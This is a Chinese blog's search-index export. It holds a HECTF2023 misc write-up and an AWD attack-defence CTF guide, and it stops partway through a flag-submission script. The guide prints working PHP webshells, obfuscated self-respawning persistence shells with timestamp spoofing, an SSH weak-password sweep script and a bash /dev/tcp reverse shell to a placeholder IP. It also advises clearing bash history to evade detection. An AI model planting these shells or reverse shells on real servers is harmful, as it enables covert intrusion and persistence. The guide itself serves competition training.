<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HECTF2023</title>
    <link href="/2023/11/20/HECTF2023/"/>
    <url>/2023/11/20/HECTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ezpcap"><a href="#ezpcap" class="headerlink" title="ezpcap"></a>ezpcap</h2><p>打开流量包</p><p>观察到HTTP状态码两百</p><p>点开看到里面有个压缩包，加密了</p><p>翻翻tcp流量得到密码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">SEVMTE9IRUNURlgyejBVbTIzUkY</span><span class="hljs-operator">=</span><br>解出来<br>HELLOHECTFX2z0Um23RF<br>试了试密码是X2z0Um23RF<br></code></pre></td></tr></table></figure><p>打开得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-wp-Web&amp;Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD总结</title>
    <link href="/2023/11/17/AWD%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/17/AWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="引文"><a href="#引文" class="headerlink" title="引文"></a>引文</h1><p>AWD赛制是一种网络安全竞赛的赛制。AWD赛将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。</p><h1 id="AWD-规则"><a href="#AWD-规则" class="headerlink" title="AWD 规则"></a>AWD 规则</h1><p>AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。</p><ul><li>1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li><li>2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；</li><li>3.flag在主办方的设定下每隔一定时间刷新一轮；</li><li>4.各队一般都有一个初始分数；</li><li>5.flag一旦被其他队伍拿走，该队扣除一定积分；</li><li>6.得到flag的队伍加分；</li><li>7.一般每个队伍会给一个低权限用户，非root权限；</li><li>8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。</li></ul><h2 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h2><p>常见的形式是这样：<br>每个队伍拥有四台服务器。其中三台服务器运行了一个Web服务，即网站服务。剩余一台（通常被称为Pwn服务器）运行一个网络服务，通常是一个在后台运行的二进制程序，通过TCP的某个端口对外提供服务。并且，每个队伍拥有的四台服务器都是一样的。<br>在三台Web服务器中，比赛主办方会在每个主机上预置一个或多个后门&#x2F;漏洞。同样的，在剩下的一台服务器上的二进制程序里也会被预置二进制漏洞（跟Pwn题一样）。</p><h2 id="比赛方法"><a href="#比赛方法" class="headerlink" title="比赛方法"></a>比赛方法</h2><p>在开始比赛前，通常会有一段时间（一般是30分钟）的加固时间。选手们要在这段时间内备份网站、安装防火墙、加固服务器，以防后续比赛时间被对手打穿。另外，队伍需要分工明确，在其他队友加固服务器的同时，另外的队友应该将备份的服务器文件下载，然后对其进行代码审计和漏洞挖掘（Web手）、逆向与二进制漏洞分析（Pwn手）。在发现漏洞后，及时对自身网站进行漏洞修补与加固。<br>比赛开始后分为两种情况，一种是主办方给出所有队伍服务器的IP地址，另一种情况是给一个网段，对手的服务器IP需要通过扫描等方法进行发现。<br>比赛将分为很多轮（一般可能是10分钟）。每轮开始，在每台服务器的某个地方（一般是根目录）会放置一个flag文件（每个队伍每台主机都不一样）。选手们需要通过挖掘到的漏洞编写漏洞利用代码（Exp），然后对其他队伍的服务器进行攻击并最终获取shell执行权限（getshell）或者通过文件读漏洞来读取对手服务器根目录下的flag文件，并向比赛平台提交flag。当攻击方成功攻击对手服务器并提交flag后，攻击方将获得一定的分数，同时防守方将丢失一定的分数（一般来讲，同一台机器被攻击会被扣除固定分数，而所有对这台服务器攻击成功的队伍将平分这些分数）。<br>在攻击的同时，也要注意自身服务器的防护。当自己的服务器被对手攻击提交flag后，队伍将被扣分。并且要防止服务器不要被破坏，因为每轮（一般是结束时）比赛时比赛平台会对所有队伍的服务器进行check，即检查服务是否正常运转。若出现服务被对手或自己破坏以至于无法提供正常服务的情况，平台将对其队伍进行扣分，同时其他队伍获得相应的加分。<br>每轮结束后将开始新一轮，此时所有flag文件将刷新，以开始新一轮的攻击和得分。若队伍发现自己服务器服务被破坏，此时可以刷新服务器回到初始状态。否则在比赛途中手动进行刷新服务器操作将导致扣分。<br>一般的比赛平台为了让比赛保持激烈的状态，会开放自动提交flag的API。即可以通过脚本更加方便地向比赛平台提交flag。</p><h2 id="通用技巧"><a href="#通用技巧" class="headerlink" title="通用技巧"></a>通用技巧</h2><p>Web漏洞扫描可以使用例如D盾这样的工具，可以快速发现明显的Web后门。代码审计可以用Seay或者Fortify这样的工具。<br>一般AWD比赛禁止联网，所以队友间文件共享和通信可以使用FeiQ这样的内网通讯工具来进行。<br>当网站文件被修改，例如被植入木马的情况下，我们可以使用DiffMerge、Beyond Compare这样的工具来对比源文件进行检查。</p><h2 id="防护技巧"><a href="#防护技巧" class="headerlink" title="防护技巧"></a>防护技巧</h2><p>防护是最重要的一环。一般来讲只要你保护到位了，不让别人打进来你就赢了一半。因为你不会扣分，还有机会平分其他倒霉蛋丢的分。<br>首先一定要更改服务器初始ssh密码（数据库密码也是一样的）。有些比赛会将所有服务器的ssh服务设置相同的密码，如果你不第一时间改密码别人可以直接登录获得flag并留下后门。同样的，在比赛开始时第一时间也可以去测试别人的服务器是否更改密码以通过最简单的方式得分。<br>然后就是对数据库、网站文件进行完全的备份。如果出现服务器被其他队伍破坏或其他情况，可以自己去通过备份的文件进行恢复、修复。不然的话只能被打穿等下一轮或者手动刷新服务器，这样将丢失大量分数。<br>然后就是安装防火墙。就是WAF，可以对不明请求进行拦截和记录，这样你就可以对恶意攻击请求进行拦截。并且通过监控请求日志来推测攻击方的攻击方法，从而发现前面没有发现的漏洞，并快速进行exp编写和攻击。<br>部署文件监控脚本。这样可以通过文件创建时间来监控后来生成的文件，并进行删除，防止挂马。<br>一般上面的都部署好了可以抵挡大部分攻击了。</p><h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><p>首先AWD比赛非常激烈，每一轮时间很短，所以几乎所有防护&#x2F;攻击操作都会使用脚本的方式来进行。所以一般一个队伍的分工是这样的：Web手进行漏洞挖掘、修复；Pwn手进行Pwn题的漏洞挖掘、利用；防守者进行网站防护与日志、文件监控；如果还有一个人的话可以负责应急和exp编写。所有人都应该具备快速exp编写的能力，以适应激烈的比赛节奏。<br>很重要的一点是，因为所有队伍的服务器都是一样的，所以所有的防护操作都对应了相应的攻击操作。比如上面的初始密码，我们不仅要对其进行防护，也能够通过相同的方式进行攻击。<br>一般我们都是通过事先准备好的脚本进行攻击。IP扫描、WAF部署等操作也是一样，通过事先准备好的工具或脚本进行扫描。并且IP扫描、漏洞利用、flag获取、flag提交等所有操作都应该全部自动化。比如比赛开始，Web手发现漏洞后编写利用脚本，编入事先准备好的exp中并运行，此时脚本开始扫IP，得到对手服务器IP列表后逐个进行利用，攻击成功后自动获取flag，最后通过平台API自动提交。这样一来效率就会很高。</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>漏洞利用后，例如成功上传服务器木马后需要注入不死马或者内存马以进行权限维持，否则对方发现后删除木马并且修复漏洞后就没用了。</p><h1 id="站点部署"><a href="#站点部署" class="headerlink" title="站点部署"></a>站点部署</h1><p>比赛开始时我们会分配到一个至多个靶机，通常是分配给我们ssh 用户名和密码还有虚拟ip等信息，我们需要自己去连接靶机。个人推荐使用<code>xshell</code>搭配<code>xftp</code>来使用，当我们连接靶机之后要做什么呢。</p><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>比赛开始第一时间备份，备份网站目录及数据库，一般在 <code>/var/www/html</code> 目录。</p><p>一是为了dump下来，用D盾查杀存在的后门；<br>二是为了比赛出现异常或恶意破坏进行还原，避免靶机宕机被扣分；<br>三要审计下有没有高危命令执行函数，进行后期加固，以及有空余时间或专门安排一个人审计下基础漏洞用来做攻击。<br>命令执行函数 <code>exec()</code>、<code>passthru()</code>、<code>system()</code>、 <code>shell_exec()</code>、<code>popen()</code> 等;代码执行函数：<code>eval()</code>、<code>assert()</code>、<code>preg_repace()</code>、<code>uasort()</code> 等；文件包含函数 <code>include()</code> 、<code>require()</code> 等，用正则匹配 <code>grep -r &quot;@eval&quot; /www/</code>，找到后注释掉。</p><h2 id="dump源码"><a href="#dump源码" class="headerlink" title="dump源码"></a>dump源码</h2><p>比赛开始第一件事，<strong>dump</strong>网站源码，使用ssh工具保留源码，复制两份，用<strong>d盾</strong>去扫一份，因为当我们靶机受到攻击时对手可能直接删除我们的源码导致靶机<strong>DOWN</strong>机，而通常比赛中主办方会在源码中留有一些<strong>后门</strong>，我们用D盾去扫描一下来进行<strong>修复</strong>和<strong>攻击</strong>。</p><h2 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h2><p>我们登录数据库来进行备份，当数据被删除时可以使用命令快速还原。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqldump -u db_user -p db_passwd db_name &gt; 1.sql //备份指定数据库<br></code></pre></td></tr></table></figure><p>还原命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -u db_user -p db_passwd db_name &lt; 1.sql //还原指定数据库<br></code></pre></td></tr></table></figure><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，立马快速检查修改自己密码，并利用此进行攻击。一般默认密码为 <code>admin/admin, admin/123456, test/test</code>，如果被其他队伍改了那就gg了</p><p>当主办方给我们的连接密码过于简单时，不排除对手先登录我们靶机来进行破坏，于是我们要快速修改弱口令密码。</p><p>linux修改ssh即本地密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd<br></code></pre></td></tr></table></figure><p>修改mysql登录密码:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt;<span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@localhost =password(<span class="hljs-string">&#x27;xino&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="关闭不必要端口"><a href="#关闭不必要端口" class="headerlink" title="关闭不必要端口"></a>关闭不必要端口</h2><p>一些端口会存在漏洞，为了保证安全我们关闭一些不必要的端口来进行维护：</p><p><img src="/2023/11/17/AWD%E6%80%BB%E7%BB%93/f842743427944186be4247b05303d6eftplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp" alt="图片.png"></p><h2 id="部署WAF"><a href="#部署WAF" class="headerlink" title="部署WAF"></a>部署WAF</h2><p>WAF是用来分析阻挡对手攻击的工具它可以分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。当没有攻击思路时我们就可以分析流量，使用别人的攻击方式。 部署方式如下：</p><p>每个文件前边加：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">require_once</span>(waf.php);<br></code></pre></td></tr></table></figure><p>为了方便我们可以修改php.ini配置文件，来自动给当前文件夹下文件头部添加：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=&lt;filename&gt;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h1 id="攻击-ATTACK"><a href="#攻击-ATTACK" class="headerlink" title="攻击(ATTACK)"></a>攻击(ATTACK)</h1><p>当我们部署完自己的靶机确认没有漏洞后，我们便可以尝试攻击别人机器了。</p><h2 id="权限维持-1"><a href="#权限维持-1" class="headerlink" title="权限维持"></a>权限维持</h2><p>过盾一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;a=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<span class="hljs-title function_ invoke__">print_r</span>(`<span class="hljs-variable">$a</span>`)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;a=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$k</span>=(`<span class="hljs-variable">$a</span>`);<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;cookie:&#x27;</span>.<span class="hljs-variable">$k</span>);<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;a=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$k</span>=(`<span class="hljs-variable">$a</span>`);<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;cookie:&#x27;</span>.<span class="hljs-variable">$k</span>);<br></code></pre></td></tr></table></figure><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>官方在给出服务器密码时，很有可能是默认的，需要赶快修改自己的密码并尝试能不能登录别人的靶机<br>存在某些队伍忘记修改SSH弱口令，尝试使用python脚本连接获取flag</p><p>当发现靶机存在弱口令后，我们就可以遍历IP地址来查询存活的机器来自动连接查找FLAG,或者在受害者靶机里植入后门文件来维持我们的控制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko <span class="hljs-comment">#paramiko是一个用于做远程控制的模块</span><br><span class="hljs-keyword">import</span> threading <span class="hljs-comment">#threading模块是Python里面常用的线程模块</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssh2</span>(<span class="hljs-params">ip,username,passwd,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    ssh=paramiko.SSHClient() <span class="hljs-comment">#创建一个ssh对象</span><br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) <span class="hljs-comment">#自动选择yes</span><br>    ssh.connect(ip,<span class="hljs-number">22</span>,username,passwd,timeout=<span class="hljs-number">0.1</span>) <span class="hljs-comment">#连接服务器</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> cmd:<br>      stdin,stdout,stderr=ssh.exec_command(m) <span class="hljs-comment">#执行操作</span><br>      out=stdout.readlines() <span class="hljs-comment">#获取命令执行的结果</span><br>      <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">print</span>(o)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%stOKn&#x27;</span>%(ip))<br>    ssh.close()<br>  <span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%stErrorn&#x27;</span>%(ip))<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  cmd=[<span class="hljs-string">&#x27;cat /flag&#x27;</span>]<br>  username=<span class="hljs-string">&#x27;root&#x27;</span><br>  passwd=<span class="hljs-string">&#x27;root&#x27;</span><br>  threads=[<span class="hljs-number">10</span>]<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">149</span>,<span class="hljs-number">151</span>):<br>    ip=<span class="hljs-string">&#x27;192.168.75.&#x27;</span>+<span class="hljs-built_in">str</span>(i)<br>    a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))<br>    a.start()<br></code></pre></td></tr></table></figure><h2 id="自带后门"><a href="#自带后门" class="headerlink" title="自带后门"></a>自带后门</h2><p>通常靶机会有自带的后门木马，我们知道路径后便可以写一个脚本批量连接来提交FLAG。</p><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>扫描C段存活主机:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">.\nmap xxx<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>保存为TXT文件以便于之后编写脚本去攻击。</p><p><img src="/2023/11/17/AWD%E6%80%BB%E7%BB%93/9d4d96b883fd4c4abfdc92a0567063b5tplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp" alt="图片.png"></p><h2 id="WEB攻击"><a href="#WEB攻击" class="headerlink" title="WEB攻击"></a>WEB攻击</h2><p>举几个比较常见的WEB攻击方式:</p><blockquote><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">文件读取，伪协议方式读取<span class="hljs-built_in">flag</span><br><br>文件上传，绕过黑白名单上传一句话，用工具连接查找<span class="hljs-built_in">flag</span><br><br>命令执行，通过system等函数来遍历文件<br><br>SQL注入，寻找注入点注出<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure></blockquote><p>当我们找到上面漏洞后，尽量去写一个脚本来自动提交flag，之后再去寻找其他漏洞。</p><h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>因为AWD赛制是回合制，所以我们要想保持长时间稳定上分就要时刻控制别人靶机，也就是要传入木马但又不能被对手发现，下面列举几个权限维持的小技巧。</p><h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a><strong>bash反弹shell</strong></h3><p>利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，nc反弹shell命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xxx/9 0&gt;&amp;1<br>nc -l -p 8080<br></code></pre></td></tr></table></figure><p><img src="/2023/11/17/AWD%E6%80%BB%E7%BB%93/36661890a1e84381bbcab4db5837f459tplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp" alt="图片.png"></p><p><strong>注意：</strong> 使用bash命令，会在root目录生成名为~&#x2F;.bash_history的记录文件，我们要清除来消除威胁。</p><h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a><strong>不死马</strong></h3><h6 id="1-一个简单的不死马："><a href="#1-一个简单的不死马：" class="headerlink" title="1.一个简单的不死马："></a>1.一个简单的不死马：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.config.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2020-10-21 04:17:18&quot; .config.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不死马的作用就是将该php文件上传到服务器，然后进行访问，会在该路径下循环生成名字为.config.php的不死马隐藏文件。以此来达到权限维持。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">//设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//设置脚本最大执行时间，这里设置为0，即没有时间方面的限制</span><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment">//删除文件本身，以起到隐蔽自身的作用</span><br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.config.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;&lt;span class=&quot;label label-primary&quot;&gt;@eval($_POST[a]);&#125;&lt;/span&gt; ?&gt;&#x27;</span>; <span class="hljs-comment">//进行校验是为了防止自家木马被其他人利用</span><br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>); <span class="hljs-comment">//while循环中每隔usleep(5000)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中会有队伍使用find命令查看文件的修改时间</span><br>    &#125;<br>?&amp;gt;<br></code></pre></td></tr></table></figure><h6 id="2-另一个不死马"><a href="#2-另一个不死马" class="headerlink" title="2.另一个不死马"></a>2.另一个不死马</h6><p>直接linux执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>;<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;x&quot;]);?&gt;&#x27;</span> &gt; x.php;<span class="hljs-built_in">sleep</span> 1;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>或<br><strong>bs1.php</strong><br>访问后同目录持续生成 <code>.test.php</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//程序执行时间</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-comment">//关掉终端后脚本仍然运行</span><br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//文件完整名</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.test.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;);   // pwd=x</span><br><span class="hljs-string">$b=array_keys($a)[0];</span><br><span class="hljs-string">eval($b);?&gt;&#x27;</span>);<br> <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>bs2.php</strong><br>访问后同目录持续生成 <code>.config.php</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br> <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br> <span class="hljs-title function_ invoke__">unlink</span>(_FILE);<br> <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./.config.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;chmod777.config.php&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">touch</span>(<span class="hljs-string">&quot;./.config.php&quot;</span>,<span class="hljs-title function_ invoke__">mktime</span>(<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">28</span>,<span class="hljs-number">2016</span>));   <span class="hljs-comment">// pwd=1</span><br>  <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">100</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="提交脚本"><a href="#提交脚本" class="headerlink" title="提交脚本"></a>提交脚本</h1><p>比赛中可能会有几十台靶机，尽管我们知道了如何攻击，但一个一个打似乎有一些太慢了，所以这时我们要利用脚本去批量提交解放双手。这里就在网上找了几个常用的：</p><p>预留后门利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 